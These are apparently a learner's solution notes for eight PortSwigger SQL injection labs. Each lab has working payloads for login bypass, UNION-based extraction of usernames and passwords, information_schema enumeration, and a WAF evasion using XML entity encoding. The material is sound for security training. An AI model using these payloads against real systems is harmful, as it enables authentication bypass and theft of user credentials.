# SQL injection

# [**_1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data_**](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Lifestyle' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

```sql
SELECT * FROM products WHERE category = '' or 1=1--' AND released = 1
```

payload:

```
' or 1=1--
```

# [**_2. Lab: SQL injection vulnerability allowing login bypass_**](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

plan:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '1234'
```

payload:

```
administrator'--
```

# [**_3. Lab: SQL injection UNION attack, determining the number of columns returned by the query_**](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

payload:

```
Gifts'+union+SELECT+null,null,null+FROM+information_schema.tables--+
```

# [**_4. Lab: SQL injection UNION attack, finding a column containing text_**](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

payload:

```
Accessories'+union+SELECT+null,'0IGctA',null+FROM+information_schema.tables--+
```

# [**_5. Lab: SQL injection UNION attack, retrieving data from other tables_**](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

plan:
product category filter

table:
users

columns:
password
username

payload:

stage_1:

```
'+union+SELECT+nul+FROM+users--+
```

stage_2:

```
'+union+SELECT+null,null+FROM+users--+
```

stage_3:

```
'+union+SELECT+'null','null'+FROM+users--+
```

stage_4:

```
'+union+SELECT+username,password+FROM+users--+
```

# [**_6. Lab: SQL injection UNION attack, retrieving multiple values in a single column_**](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

plan:
product category filter

table:
users

columns:
password
username

payload:

stage_1:

```
'+union+SELECT+nul+FROM+users--+
```

stage_2:

```
'+union+SELECT+null,null+FROM+users--+
```

stage_3:

```
'+union+SELECT+null,'null'+FROM+users--+
```

stage_4:

```
'+union+SELECT+null,username+||+'+***+'+||+password+FROM+users--+
```

# [**_7. Lab: SQL injection with filter bypass via XML encoding_**](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

Hint
A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this.

payload:

```
<storeId>1&#117;nion &#115;elect username||&apos;   &apos;||password from users</storeId>
```

# [**_8. SQL injection attack, listing the database contents on non-Oracle databases_**](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

1. determine how many columns are in the current table:

```sql
'+union+SELECT+null,null+FROM+information_schema.tables--+
```

2. determine how many of them support string values:

```sql
'+union+SELECT+'null','null'+FROM+information_schema.tables--+
```

3. find table names:

```sql
'+union+SELECT+table_name,'null'+FROM+information_schema.tables--+
```

response:<th>users_rxyjbm</th>

4. find columns:

```sql
'+union+SELECT+column_name,'null'+FROM+information_schema.columns--+
```

response:

<th>password_ozisqd</th>
<th>username_eambhu</th>

5. final payload:

```sql
'+union+SELECT+username_eambhu,password_ozisqd+FROM+users_rxyjbm--+
```

in class:
